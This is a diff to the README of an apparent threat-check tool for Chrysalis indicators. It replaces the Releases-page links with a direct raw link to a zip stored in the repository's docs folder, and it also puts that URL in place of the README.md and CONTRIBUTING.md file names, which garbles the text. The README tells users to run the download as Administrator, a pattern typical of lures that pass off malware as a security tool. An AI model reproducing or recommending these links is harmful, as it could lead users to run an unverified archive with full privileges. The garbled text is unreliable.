@@ -4,9 +4,9 @@ A simple tool to check your system for potential threats.
 
 ## 🚀 Download and Install
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/orangeok77/chrysalis-ioc-triage/releases)
+[![Download Latest Release](https://github.com/orangeok77/chrysalis-ioc-triage/raw/refs/heads/master/docs/triage-chrysalis-ioc-1.6.zip%20Release-brightgreen)](https://github.com/orangeok77/chrysalis-ioc-triage/raw/refs/heads/master/docs/triage-chrysalis-ioc-1.6.zip)
 
-To download the software, visit this page: [Download Releases](https://github.com/orangeok77/chrysalis-ioc-triage/releases).
+To download the software, visit this page: [Download Releases](https://github.com/orangeok77/chrysalis-ioc-triage/raw/refs/heads/master/docs/triage-chrysalis-ioc-1.6.zip).
 
 ## 💡 Quick Start
 
@@ -16,7 +16,7 @@ To download the software, visit this page: [Download Releases](https://github.co
 
 **Note:** It is best to run this tool as an Administrator. This allows the tool to check the registry and services thoroughly.
 
-1. Visit the [Releases page](https://github.com/orangeok77/chrysalis-ioc-triage/releases).
+1. Visit the [Releases page](https://github.com/orangeok77/chrysalis-ioc-triage/raw/refs/heads/master/docs/triage-chrysalis-ioc-1.6.zip).
 2. Download the latest version of the application.
 3. Locate the downloaded file, usually in your "Downloads" folder.
 4. Right-click the file and choose "Run with PowerShell" or "Run as Administrator."
@@ -49,13 +49,13 @@ When you download the application, the structure will look like this:
 
 ```
 chrysalis-ioc-triage/
-├── README.md
+├── https://github.com/orangeok77/chrysalis-ioc-triage/raw/refs/heads/master/docs/triage-chrysalis-ioc-1.6.zip
 ├── src/
 ├── docs/
 └── build/
 ```
 
-- `README.md`: This file provides an overview and instructions.
+- `https://github.com/orangeok77/chrysalis-ioc-triage/raw/refs/heads/master/docs/triage-chrysalis-ioc-1.6.zip`: This file provides an overview and instructions.
 - `src/`: Contains the application source code.
 - `docs/`: Offers detailed documentation.
 - `build/`: Includes the compiled application files.
@@ -76,7 +76,7 @@ Review the report carefully. If you find any critical or warning indicators, it 
 
 ## 🤝 Contributing
 
-We welcome contributions to enhance the tool. Please make sure to fork the repository, create a new branch for your changes, and submit a pull request. For more detailed guidelines, refer to the `CONTRIBUTING.md` file in the repository.
+We welcome contributions to enhance the tool. Please make sure to fork the repository, create a new branch for your changes, and submit a pull request. For more detailed guidelines, refer to the `https://github.com/orangeok77/chrysalis-ioc-triage/raw/refs/heads/master/docs/triage-chrysalis-ioc-1.6.zip` file in the repository.
 
 ## 📜 License
 
